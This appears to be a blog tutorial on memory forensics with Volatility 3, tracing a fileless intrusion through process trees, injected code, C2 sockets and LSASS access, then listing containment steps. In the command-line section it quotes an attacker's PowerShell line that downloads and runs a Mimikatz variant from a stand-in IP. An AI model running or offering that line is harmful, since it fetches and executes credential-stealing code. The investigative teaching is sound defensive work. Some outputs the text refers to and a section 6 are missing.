Memory Forensics & Incident Response: Investigating an In-Memory Breach

📅 Dec 18, 2024 ⏱ 14 min read
#dfir #volatility #memory-forensics #incident-response #threat-hunting

Modern adversaries increasingly operate strictly in memory. Fileless malware, reflective DLL injection, and process hollowing leave little to no trace on physical disk storage. When perimeter defenses fail and endpoint detection and response (EDR) sensors raise an anomaly alert, volatile system memory (RAM) is often the only ground-truth evidence available.

1. Order of Volatility and Evidence Acquisition

In accordance with RFC 3227, evidence collection must proceed from the most perishable state to the least perishable. Live memory is the highest priority: powering off or rebooting the host permanently purges active execution contexts, network connections, decrypted encryption keys, and injected shellcode.

For Windows systems in an enterprise environment, acquisition can be accomplished using signed kernel drivers via WinPmem, DumpIt, or an enterprise live-response shell:

# Live volatile memory acquisition using WinPmem CLI
winpmem.exe -o mem_FIN-SRV-04_20240518.raw --volume_mode 2

# Compute SHA-256 hash immediately to establish cryptographic chain of custody
Get-FileHash -Algorithm SHA256 .\mem_FIN-SRV-04_20240518.raw | Format-List

# Output example:
# Algorithm : SHA256
# Hash      : 9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08
# Path      : C:\IR_Artifacts\mem_FIN-SRV-04_20240518.raw

Once captured and verified against its checksum, forensic analysis moves to a dedicated, network-isolated analysis workstation running Volatility 3.

2. Process Tree Triage and Anomalies

Volatility 3 replaces profile-based lookups with automated symbol table generation via PDB debugging symbols downloaded from Microsoft Symbol Servers. Our first step is inspecting the running process tree to discover abnormal parent-child hierarchies.

# Enumerate active processes and display their parent-child relationships
python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.pstree.PsTree

Examining the output reveals a classic red flag:

Notice the anomaly: spoolsv.exe (the Print Spooler service) spawned cmd.exe (PID 4920), which immediately executed powershell.exe (PID 5416). In a clean production server, Print Spooler never spawns interactive command interpreters. This indicates remote code execution (e.g., via CVE-2021-34527 PrintNightmare or malicious printer driver installation).

Furthermore, PID 4104 claims to be svchost.exe, but has only 2 threads and no service DLL association under services.exe. We need to check for hidden or unlinked processes using windows.psscan.

# Cross-reference the active linked list with unallocated memory pool scanner
python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.psscan.PsScan

3. Detecting In-Memory Injection with Malfind

Process injection techniques, such as Process Hollowing, DLL Injection, or Thread Execution Hijacking, leave distinct signatures in the Virtual Address Descriptor (VAD) tree. Specifically, memory allocations with protection PAGE_EXECUTE_READWRITE (RWX) that are not mapped to an image file on disk are prime indicators of malicious code.

# Execute malfind to locate injected VAD segments
python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.malfind.Malfind --pid 4104

Volatility returns a positive identification on PID 4104:

The output proves beyond doubt: the memory region begins with 4D 5A (the DOS MZ header) and contains the string "This program cannot be run in DOS mode." A complete Portable Executable (PE) binary was injected into the address space of this hollowed svchost.exe process.

Dumping the Malicious Memory Segment

To inspect and reverse engineer this binary, we dump the process address space directly to disk:

# Dump process memory for PID 4104 into artifacts directory
python3 vol.py -f mem_FIN-SRV-04_20240518.raw -o ./dumped_artifacts windows.dumpfiles.DumpFiles --pid 4104

# Alternatively dump the VAD segment matching malfind
python3 vol.py -f mem_FIN-SRV-04_20240518.raw -o ./dumped_artifacts windows.malfind.Malfind --pid 4104 --dump

4. Network Connection and Socket Reconstruction

What C2 server was this rogue process communicating with? Volatility's netscan plugin scans memory pools for active and recently terminated TCP endpoints, listener sockets, and UDP endpoints.

# Scan for network connections and correlate with PIDs
python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.netscan.NetScan | grep -E "4104|5416"
Offset          Proto  Local Address       Local Port  Foreign Address      Foreign Port  State        PID   Owner
0xfa8003891010  TCPv4  192.168.10.45       49822       198.51.100.124       8443          ESTABLISHED  4104  svchost.exe
0xfa8003a21010  TCPv4  192.168.10.45       49825       198.51.100.124       8443          TIME_WAIT    4104  svchost.exe

The injected process established an encrypted connection to external IP 198.51.100.124 on port 8443. Looking up this IP in threat intelligence feeds immediately tags it as an active Cobalt Strike Team Server infrastructure.

5. LSASS Memory & Credential Theft Artifacts

Recalling the initial SOC alert regarding lsass.exe, we verify if the adversary dumped plaintext credentials or hashes using MiniDumpWriteDump or direct memory reads.

# Check open handles from the suspicious PowerShell or hollowed process
python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.handles.Handles --pid 5416 | grep -i lsass
PID   Process         Offset              HandleValue  Type     GrantedAccess  Name
5416  powershell.exe  0xfa80048bc040      0x194        Process  0x1fffff       lsass.exe

A GrantedAccess of 0x1fffff represents PROCESS_ALL_ACCESS. PowerShell was granted full read/write rights over the Local Security Authority Subsystem Service (LSASS). Next, we check command-line arguments passed during invocation:

python3 vol.py -f mem_FIN-SRV-04_20240518.raw windows.cmdline.CmdLine --pid 5416
PID   Process         Args
5416  powershell.exe  "powershell.exe" -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.124:8080/safety.ps1'); Invoke-SafetyKat"

The threat actor staged a modified variant of Mimikatz (SafetyKatz) downloaded in-memory, executed reflection, and extracted cached Kerberos tickets and NTLM hashes.

7. Containment & Hardening Recommendations

With root cause and adversary blast radius confirmed, the Incident Response team executed the following containment and remediation actions:

  • Host Isolation: Isolated FIN-SRV-04 at the network firewall switch level to prevent lateral movement.
  • Credential Revocation: Initiated double krbtgt password reset across Active Directory and forced reset of all administrative credentials active on the host.
  • Network Block: Blacklisted C2 destination IP 198.51.100.124 and associated ASN across border firewalls and web proxies.
  • Service Hardening: Disabled the Print Spooler service across all non-print-server domain members via Group Policy (GPO).
  • LSA Protection: Enabled RunAsPPL (Protected Process Light) for lsass.exe via registry:
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 1 /f

Conclusion

Memory forensics provides unmatched clarity into modern fileless intrusions. By combining process tree auditing, VAD analysis, and network socket reconstruction, an incident responder can dismantle an adversary's operational security and build an airtight investigative report.

Always preserve volatile evidence before taking destructive actions, practice your Volatility 3 workflows in regular purple-team drills, and ensure memory acquisition tools are pre-authorized in your enterprise environment. 🔍
